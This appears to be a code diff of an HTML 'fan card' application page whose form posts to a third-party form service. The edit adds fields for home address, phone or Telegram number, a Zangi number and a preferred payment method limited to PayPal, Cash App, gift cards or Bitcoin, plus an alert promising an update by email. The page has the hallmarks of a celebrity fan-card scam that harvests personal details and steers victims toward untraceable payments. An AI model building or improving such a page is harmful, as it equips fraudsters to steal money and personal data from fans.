@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Get Your Fan Card</title>
   <style>
     body {
@@ -15,7 +15,6 @@
       height: 100vh;
       margin: 0;
     }
-
     .form-container {
       background-color: rgba(255, 255, 255, 0.1);
       padding: 30px;
@@ -24,26 +23,23 @@
       max-width: 400px;
       width: 100%;
     }
-
     h2 {
       text-align: center;
       margin-bottom: 20px;
     }
-
     label {
       display: block;
       margin: 10px 0 5px;
     }
-
     input[type="text"],
-    input[type="email"] {
+    input[type="email"],
+    select {
       width: 100%;
       padding: 10px;
       border: none;
       border-radius: 6px;
       margin-bottom: 15px;
     }
-
     input[type="submit"] {
       background-color: #fff;
       color: #764ba2;
@@ -55,11 +51,8 @@
       cursor: pointer;
       transition: background 0.3s ease;
     }
-
-    input[type="submit"]:hover {
-      background-color: #eee;
+    input[type="submit"]:hover {background-color: #eee;
     }
-
     small {
       display: block;
       text-align: center;
@@ -70,28 +63,43 @@
   </style>
 </head>
 <body>
-  <form action="https://formspree.io/f/mwpqlrkl" method="post" id="fanForm">
-  <div class="form-container">
-    <h2>Apply for My Fan Card</h2>
+  <form action="https://getform.io/f/bronvgxa" method="post" id="fanForm">
+    <div class="form-container">
+      <h2>Apply for My Fan Card</h2>
+
       <label for="fullname">Full Name:</label>
-      <input type="text" id="fullname" name="fullname" required>
+      <input type="text" id="fullname" name="fullname" required />
 
       <label for="address">Home Address:</label>
-      <input type="text" id="address" name="address" required>
+      <input type="text" id="address" name="address" required />
 
       <label for="email">Email Address:</label>
-      <input type="email" id="email" name="email" required>
+      <input type="email" id="email" name="email" required />
 
-      <input type="submit" value="Apply Now">
-    </form>
-    <p><small>Note: Your details will be used only for fan card registration.</small></p>
-  </div>
+      <label for="phone">Phone or Telegram Number:</label>
+      <input type="text" id="phone" name="phone" required />
+
+      <label for="zangi">Zangi Number (Optional):</label>
+      <input type="text" id="zangi" name="zangi" />
+
+      <label for="payment">Preferred Payment Method:</label>
+      <select id="payment" name="payment" required>
+        <option value="" disabled selected>Select a payment method</option>
+        <option value="PayPal">PayPal</option>
+        <option value="Cash App">Cash App</option>
+        <option value="Gift Card">Gift Card</option><option value="Bitcoin">Bitcoin</option>
+      </select>
+
+      <input type="submit" value="Apply Now" />
+    </div>
+  </form>
+
   <script>
-  document.getElementById('fanForm').addEventListener('submit', function() {
-    alert('Thank you for applying! We’ll get back to you soon.');
-  });
-</script>
-
+    document.getElementById('fanForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // prevent default submission
+      alert("Application successfully submitted! You'll receive an update in your email.");
+      this.submit(); // submit the form after alert
+    });
+  </script>
 </body>
 </html>
-```
